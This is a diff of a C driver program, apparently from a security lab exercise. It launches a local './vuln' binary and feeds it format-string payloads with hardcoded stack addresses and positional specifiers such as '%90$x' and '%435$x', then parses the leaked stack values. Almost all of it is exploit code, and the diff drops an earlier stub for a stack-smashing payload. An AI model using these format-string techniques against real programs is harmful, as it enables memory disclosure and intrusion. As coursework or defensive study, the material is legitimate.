@@ -120,7 +120,8 @@ int main(int argc, char* argv[]) {
    create_subproc("./vuln", nargv);
 
    // print something from the stack
-   put_str("e \"AAAAAAAAAAAAAAAAA %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g  %g %g %g %g %g %g %g %g %g %g  %g %g %g %g %g %g %g %g %g %g %g %g %g %g %x %x %x %x\"");
+   put_bin("e BBBBBB\xde\xef\xff\xbfJUNK\xdc\xef\xff\xbf %90$x %91$x %92$x", 38);
+   //put_str(buf);
    send();
 
    // extract something (e.g., the second element) from output 
@@ -128,17 +129,13 @@ int main(int argc, char* argv[]) {
    get_formatted("%*x%x%*x", &i);
    fprintf(stderr, "driver: Extracted %x\n", i);
 
-   // Now, do more things, e.g., prepare a stack smashing payload
-   put_str("p xyz\n");
-   send();
-   put_str("u aaaaaaaaaaaaaaaaaaa");
-   send();
-
-   put_str("l \n");
-   send();
-
    usleep(100000);
-   get_formatted("%*s");
+   put_bin("e %435$x", 8);
+   //put_str(buf);
+   send();
+   get_formatted("%*x%x%*x", &i);
+   fprintf(stderr, "driver: Extracted %x\n", i);
+
 
    kill(pid, SIGINT);
    int status;
